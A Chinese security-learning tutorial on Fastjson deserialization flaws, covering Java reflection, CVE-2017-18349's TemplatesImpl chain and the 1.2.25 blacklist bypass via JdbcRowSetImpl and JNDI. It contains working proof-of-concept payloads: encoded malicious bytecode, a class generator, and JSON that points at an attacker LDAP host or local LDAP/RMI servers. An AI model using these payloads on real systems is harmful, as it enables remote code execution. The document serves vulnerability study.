在LDAP中，DN是一个唯一的标识符，它类似于文件系统中的路径。每个DN由多个RDN（相对区分名称）组成，例如：  
```
uid=john,ou=People,dc=example,dc=com

```  
  
这个DN由三个RDN组成：uid=john、ou=People、dc=example,dc=com。可以使用如下LDAP查询语句来检索员工信息，例如：(&(objectClass=person)(uid=john))这个查询语句表示查找所有objectClass为person，且uid为john的员工信息。在LDAP中，查询语句使用LDAP搜索过滤器（LDAP Search Filter）进行筛选。在Fastjson漏洞中，攻击者可以通过构造特定的LDAP查询语句，来执行任意代码或获取敏感信息。例如，以下JSON字符串包含一个恶意构造的LDAP URL：  
```
{"@type":"java.net.URL","val":"ldap://hackervps.com/exp"}

```  
  
当Fastjson解析该JSON字符串时，会触发LDAP查询操作，查询hackervps.com上的LDAP服务，并执行名为“exp”的操作。这就是Fastjson漏洞的成因之一。  
## 6. java反射是什么？  
  
参考：  
> https://www.javasec.org/javase/Reflection/Reflection.html  
  
### （1）通过demo快速理解反射  
  
如果我们不用反射的话，我们写的代码会是下面这样：Person.java：  
```
package org.example;

public class Person {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public void sayHello() {
        System.out.println("Hello, my name is " + name + ", I'm " + age + " years old.");
    }

    public void setAge(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}

```  
  
Main.java：  
```
package org.example;

public class Main {
    public static void main(String[] args) {
        // 创建Person对象
        Person person = new Person("张三", 20);

        // 调用Person对象的sayHello方法
        person.sayHello();

        // 修改Person对象的age属性
        person.setAge(30);

        // 输出修改后的Person对象信息
        System.out.println(person);
    }
}

```  
  
运行结果如下：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm1VD3DNS173wt8pXNViaoMWCNZQWziagWxpXfLGONqDticvSprTyGwnAyw/640?wx_fmt=png "")  
可以看到，我们一开始设置人的名字为张三，年龄为20，然后我们通过setAge方法来修改Person的Age属性，把年龄改成30。但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到Java反射技术。我们可以修改上面的Main.py为如下内容：  
```
package org.example;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        // 获取Person类的Class对象
        Class<?> clazz = Class.forName("org.example.Person");

        // 创建Person对象
        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);
        Object person = constructor.newInstance("张三", 20);

        // 调用Person对象的sayHello方法
        Method method = clazz.getMethod("sayHello");
        method.invoke(person);

        // 修改Person对象的age属性
        Field field = clazz.getDeclaredField("age");
        field.setAccessible(true);
        field.set(person, 30);

        // 输出修改后的Person对象信息
        System.out.println(person);
    }
}

```  
  
这样我们就可以来动态创建对象、调用方法以及修改属性等。  
#### 问题：我还是觉得你给出的例子体现不出灵活，怎么办？  
  
不急，我们来看这么个例子：假设我们有一个配置文件，里面记录了类的名称、方法名、属性名等信息，我们可以在运行时读取配置文件，然后使用Java反射机制来创建对象、调用方法、修改属性等。这样就可以实现在不修改代码的情况下，根据配置文件来动态地创建对象、调用方法、修改属性，这样不就是很灵活很方便了么？我们来尝试用代码实现下。先建立一个配置文件，比如叫做config.properties，填写如下信息：  
```
class=org.example.Person
method=sayHello
field=age
value=30
name=W01fh4cker

```  
  
然后修改Main.java：  
```
package org.example;

import java.io.FileInputStream;
import java.util.Properties;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        // 读取配置文件
        Properties props = new Properties();
        props.load(new FileInputStream("config.properties"));

        // 获取类的名称、方法名、属性名、属性值、姓名
        String className = props.getProperty("class");
        String methodName = props.getProperty("method");
        String fieldName = props.getProperty("field");
        String fieldValue = props.getProperty("value");
        String name = props.getProperty("name");

        // 获取类的Class对象
        Class<?> clazz = Class.forName(className);

        // 获取类的有参构造方法
        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);

        // 创建类的对象
        Object obj = constructor.newInstance(name, 0);

        // 调用方法
        Method method = clazz.getMethod(methodName);
        method.invoke(obj);

        // 修改属性
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, Integer.parseInt(fieldValue));

        // 输出修改后的对象信息
        System.out.println(obj);
    }
}

```  
  
运行结果为：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmIqg9PQZKWxS2EXty48Ca1Ok164wMreHRRCkbDNbic0L2LAtEfibQXu8A/640?wx_fmt=png "")  
  
### （2）【关键！】和漏洞之间的联系？  
  
前面讲了这么多关于反射的内容，可能很多初学者和我现在一样，处于一脸懵逼的状态，为什么要用到反射，而不是直接调用java.lang.runtime来执行命令？例如我们平时经常这么玩：  
```
package org.example;

import org.apache.commons.io.IOUtils;

public class Main {
    public static void main(String[] args) throws Exception {
        System.out.println(IOUtils.toString(Runtime.getRuntime().exec("calc.exe").getInputStream(), "UTF-8"));
    }
}

```  
  
要运行上述代码，需要在maven中引入如下依赖：  
```
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.11.0</version>
</dependency>

```  
  
需要注意的是，要在上述依赖的上线加入<dependencies></dependencies>，如下图，然后点击如下图标来自动安装依赖：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmFehnswWJm0q67UzvvR69B2R3AdZxlh9Z1WibCYJRZia8tqNykvtllZOw/640?wx_fmt=png "此图是后来补的，怕萌新不知道怎么快速安装maven依赖")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmITkHAB9FfUkwBxAS2gLNIZChuYSCkPYFoqD4De66EZ7Wv8Sor1sFibA/640?wx_fmt=png "左下方可以看到正在下载依赖")  
然后运行程序，就会弹出计算器了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmPZZk1hGMNiabbZnQZfb4hYria4kQ2X2OkoVwFO80MMGpDBeiciczoKbSuQ/640?wx_fmt=png "")  
这么做不就是可以执行命令了吗，为什么还要搞反射呢？**原来，****Java****安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取****Java****的安全权限。获取****Java****的安全权限需要经过一系列的安全检查，例如检查代码的来源、检查代码的签名等。如果代码没有通过这些安全检查，就无法获取****Java****的安全权限，从而无法执行危险的操作。然而，反射机制可以绕过****Java****安全机制的限制，比如可以访问和修改类的私有属性和方法，可以调用类的私有构造方法，可以创建和访问动态代理对象等。这些操作都是****Java****安全机制所禁止的，但是反射机制可以绕过这些限制，从而执行危险的操作。**原来如此！好了，现在来学习如何使用反射调用java.lang.runtime来执行命令，由于Java9之后，模块化系统被引入，模块化系统会限制反射的使用，从而提高Java应用程序的安全性，因此我们要区分版本来学习！为了方便演示，我重新建立了一个项目，并使用Java8。我们先看如下代码：  
```
// Java version: 8
package org.example;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        Method execMethod = runtimeClass.getMethod("exec", String.class);
        Process process = (Process) execMethod.invoke(Runtime.getRuntime(), "calc.exe");
        InputStream in = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}

```  
  
成功执行：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmdeYGyzHbz38tqicoxib8iaHQXEsMfYKa3YjOiaHGHSfZwgKEpkwpIicactg/640?wx_fmt=png "")  
然后再看在Java17下的执行反射的代码：  
```
// // Java version: 17
package org.example;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public class Main {
    public static void main(String[] args) throws Throwable {
        // 获取Runtime类对象
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        MethodHandle execMethod = MethodHandles.lookup().findVirtual(runtimeClass, "exec", MethodType.methodType(Process.class, String.class));
        Process process = (Process) execMethod.invokeExact(Runtime.getRuntime(), "calc.exe");
        InputStream in = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}

```  
  
执行结果：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmzWDYS7Bpy09JrlXqNRQBOlnzSU8yq2Ev2yeYicu1Iv56DDdsTNF67HA/640?wx_fmt=png "")  
  
# 二、漏洞学习  
## 1. fastjson<=1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）  
### （1）漏洞简单复现  
  
我们看以下案例：首先创建一个maven项目、导入Fastjson1.2.23并自动下载相关依赖（怎么自动下载的见上文配图）：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmlNwywNRL2SXLYKtec6YibAVoWhtS4f4PYBiaZdzHGm4ydUGug1WewPcw/640?wx_fmt=png "")  
然后写入如下代码至Main.java（此时已经不需要Person.java了）：  
```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        ParserConfig config = new ParserConfig();
        String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }}";
        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
    }
}

```  
  
运行之后直接弹出计算器：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm3SO9gwW1VJBlFFlfH17hDva3aqmzdxbZQPtp9ZGibsiaEFkFlcRpENicw/640?wx_fmt=png "")  
  
### （2）漏洞成因分析  
  
上面的text里面的_bytecodes的内容是以下内容编译成字节码文件后（.class）再base64编码后的结果：  
```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}

```  
  
可以看到，我们通过以上代码直接定义类Test，并在类的构造方法中执行calc的命令；至于为什么要写上述代码的第14-21行，因为Test类是继承AbstractTranslet的，上述代码的两个transform方法都是实现AbstractTranslet接口的抽象方法，因此都是需要的；具体来说的话，第一个transform带有SerializationHandler参数，是为了把XML文档转换为另一种格式，第二个transform带有DTMAxisIterator参数，是为了对XML文档中的节点进行迭代。**总结：**对于上述代码，应该这么理解：建立Test类，并让其继承AbstractTranslet类，然后通过Test t = new Test();来初始化，这样我就是假装要把xml文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行calc，所以会弹出计算器。  
#### ①问题1：为什么要继承AbstractTranslet类？  
  
参考Y4tacker师傅的文章：  
> https://blog.csdn.net/solitudi/article/details/119082164  
  
  
但是在实战场景中，Java的ClassLoader类提供了defineClass()方法，可以把字节数组转换成Java类的示例，但是这里面的方法的作用域是被Protected修饰的，也就是说这个方法只能在ClassLoader类中访问，不能被其他包中的类访问：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmdISum3p2yMSQBJiaicA0n2DoqKicDkrCWibWl4icLufw4UvYp5hSjNt2dwA/640?wx_fmt=png "")  
但是，在TransletClassLoader类中，defineClass调用了ClassLoader里面的defineClass方法：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm0LbRYoiaaOvb9AZfhTEUCqrkuWzYuibXWuia3gwdGPDAGibAgyw6SYibu1g/640?wx_fmt=png "")  
然后追踪TransletClassLoader，发现是defineTransletClasses：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmFusqxGDGvGHicwhbibS3hUDHIgNb9DPU5e1mpY47cdjz981JxWOrWKjQ/640?wx_fmt=png "")  
再往上，发现是getTransletInstance：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm0sgBibylsWIZvVXRFPcbOrO1BTCicOOw6ZgvibnSnvkXhgGAYBiafwpiavA/640?wx_fmt=png "")  
到此为止，要么是Private修饰要么就是Protected修饰，再往上继续追踪，发现是newTransformer，可以看到此时已经是public了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmdkfSkaHoa5cuIQibtxGxjardObfkqibWjAgH8Cic0ljz4uibRpkpLllW8A/640?wx_fmt=png "")  
因此，我们的利用链是：  
```
TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()

```  
  
基于此，我们可以写出如下POC：  
```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class Main {
    public static class test{
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";

        cc.makeClassInitializer().insertBefore(cmd);

        String randomClassName = "W01fh4cker" + System.nanoTime();
        cc.setName(randomClassName);

        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));

        try {
            byte[] evilCode = cc.toBytecode();
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{"+
                    "\"@type\":\"" + NASTY_CLASS +"\","+
                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                    "'_name':'W01h4cker',"+
                    "'_tfactory':{ },"+
                    "'_outputProperties':{ }"+
                    "}\n";
            ParserConfig config = new ParserConfig();
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```  
  
这段代码就可以动态生成恶意类，执行效果如下：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmLrZeibCyNoGqToeQFI2MMAoSydaffdn1axucibrqOwOrvgmtUBp8dSeQ/640?wx_fmt=png "")  
  
#### ②为什么要这么构造json？  
  
可以看到，我们最终构造的json数据为：  
```
{
 "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
 "_bytecodes": ["yv66vgAAADQA...CJAAk="],
 "_name": "W01fh4cker",
 "_tfactory": {},
 "_outputProperties": {},
}

```  
  
为什么这么构造呢？还是直接看defineTransletClasses这里：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmvlZZNm6K1ziaiaBhYbBZ4qNhOYHTkKrHfYWYF5eJjkyeQvia57fPcicMwg/640?wx_fmt=png "")  
可以看到，逻辑是这样的：先判断_bytecodes是否为空，如果不为空，则执行后续的代码；后续的代码中，会调用到自定义的ClassLoader去加载_bytecodes中的byte[]，并对类的父类进行判断，如果是ABSTRACT_TRANSLET也就是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，那么就把类成员属性的_transletIndex设置成当前循环中的标记位，第一次调用的话，就是class[0]。可以看到，这里的_bytecodes和_outputProperties都是类成员变量。同时，_outputProperties有自己的getter方法，也就是getOutputProperties。![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmOwdGI95icZQ2z8jxXVoIQ7FRm4WeksbzFLuc8UcBrf7Vwrf4AAknKaQ/640?wx_fmt=png "")  
**总结：说详细一点，****TemplatesImpl****利用链的整体思路如下：****构造一个****TemplatesImpl****类的反序列化字符串，其中****_bytecodes****是我们构造的恶意类的类字节码，这个类的父类是****AbstractTranslet****，最终这个类会被加载并使用****newInstance()****实例化。在反序列化过程中，由于****getter****方法****getOutputProperties()****满足条件，将会被****fastjson****调用，而这个方法触发了整个漏洞利用流程：****getOutputProperties()**** -> ****newTransformer()**** -> ****getTransletInstance()**** -> ****defineTransletClasses()**** / ****EvilClass.newInstance()****。****限制条件也很明显：需要代码中加了**Feature.SupportNonPublicField。  
## 2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）  
### （1）黑白名单机制介绍  
  
众所周知，在fastjson自爆1.2.24版本的反序列化漏洞后，1.2.25版本就加入了黑白名单机制。例如我们更换并下载1.2.25版本的fastjson，然后再去执行原来的poc：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmValibg3q2ksmxh7fk3hrVLicOF2B3gNnAHzGXOyIYlE1k8YAd6SA6QsA/640?wx_fmt=png "")  
就会提示我们autoType is not support：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmaeBNp7iaFvnyYW7xP4hicWrlB5XV2UQGk9kYukLa79Q1CUbhpZ7tjeqw/640?wx_fmt=png "")  
查看源码可以发现这里定义了反序列化类的黑名单：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7ZibH49F3GjQpYAic5fibnLPIPibNDVZ3Zq8iaeA6uxPbqOxqcd536j9ztw/640?wx_fmt=png "")  
具体如下：  
```
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework

```  
  
接下来我们定位到checkAutoType()方法，看一下它的逻辑：如果开启了autoType，那么就先判断类名在不在白名单中，如果在就用TypeUtils.loadClass加载，如果不在就去匹配黑名单：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm2P9mFHHibNpywgjjxyvMKX76IUc0qJCgGwjUTiabSB2m66cVMGia7iaLCw/640?wx_fmt=png "")  
如果没开启autoType，则先匹配黑名单，然后再白名单匹配和加载；![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmzXUCLMZy3qdxr8GSHE7VrZy5kYR4GGt5ibma2emoSTFNRuzL2iarN5Sg/640?wx_fmt=png "")  
最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了autoType或者expectClass不为空也就是指定了Class对象时才会调用TypeUtils.loadClass加载，否则fastjson会默认禁止加载该类。我们跟进一下这里的loadClass方法：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmNbKDoYZUG01GTdiaJzVFRHVE1aqvl8rytJhsTq5zANeTXXibnekDviavQ/640?wx_fmt=png "")  
问题就出在这里：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmBsUMtnTIz7icf45EliciaM4PNBdk9KiaGVZnnnjbt9baWwJ5ERcVxuxkibw/640?wx_fmt=png "")  
我们来仔细看下上图红框中的代码，代码的含义是：如果类名的字符串以[开头，则说明该类是一个数组类型，需要递归调用loadClass方法来加载数组元素类型对应的Class对象，然后使用Array.newIntrance方法来创建一个空数组对象，最后返回该数组对象的Class对象；如果类名的字符串以L开头并以;结尾，则说明该类是一个普通的Java类，需要把开头的L和结尾的;给去掉，然后递归调用loadClass。  
### （2）黑白名单绕过的复现  
  
基于以上的分析，我们可以发现，只要我们把payload简单改一下就可以绕过。我们需要先开启默认禁用的autoType，有以下三种方式：  
```
使用代码进行添加：ParserConfig.getGlobalInstance().addAccept("org.example.,org.javaweb.");或者ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.
在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example.

```  
  
我们先去[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)下载个JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，然后启动利用工具：  
```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"

```  
  
选择下面的JDK 1.8的：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmD1sGEPC3oIqb646ib6T3ghkicV1m3ARuZSzBuDcTpb0CtgbKMypZkgcg/640?wx_fmt=png "")  
然后在Main.py中写入如下代码：  
```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        String payload = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"ldap://127.0.0.1:1389/ppcjug\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgmm9OuBBQwiavfN5PxFGE2huPmC98sicvjEiblniajmKRpjOciaOUib5NaUX7A/640?wx_fmt=png "")  
以上为第一种poc，在JDK 8u181下使用ldap测试成功，使用rmi测试失败。除此之外，另一种poc则需要满足漏洞利用条件为JDK 6u113、7u97 和 8u77之前，例如我们这里重新新建一个项目，并从[https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html)处下载jdk-8u65-windows-x64.exe并安装。然后利用新安装的jdk 8u65来启动jndi exploit：  
```
"C:\Program Files\Java\jdk1.8.0_65\bin\java.exe" -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"

```  
  
导入fastjson1.2.25：  
```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>fastjson_8u66_1_2_25</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.25</version>
        </dependency>
    </dependencies>
</project>

```  
  
在Main.java中写入如下内容：  
```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm1xogRanXsqicaU6I0kSyoaTn5HMNia0xS5xl4YJOLdqRvpen23WeQqqg/640?wx_fmt=png "")  
  
image.png  
### （3）对两种poc绕过手法的分析  
  
首先来说说限制，基于JNDI+RMI或JDNI+LADP进行攻击，会有一定的JDK版本限制。  
```
RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113
LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmmkQDCzjEBIxOWiacqHgfwNnOJYUiaxn1iaJzibsF3D1SByBSYzsEsF9CQA/640?wx_fmt=png "")  
  
image.png  
#### ①第一种poc（1.2.25-1.2.47通杀！！！）  
  
然后我们先来看**第一种**poc。我们仔细欣赏下第一种poc的payload：  
```
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1/exp","autoCommit":true}}

```  
  
